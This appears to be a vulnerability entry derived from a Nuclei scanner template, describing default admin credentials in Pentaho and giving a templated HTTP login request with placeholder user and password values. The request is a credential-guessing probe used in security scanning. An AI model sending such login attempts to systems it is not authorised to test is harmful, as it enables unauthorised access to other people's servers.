# Vulnerability: Pentaho Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`pentaho-default-login.yaml`)

## Description
Pentaho default admin credentials were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /pentaho/j_spring_security_check HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

j_username={{user}}&j_password={{pass}}
```

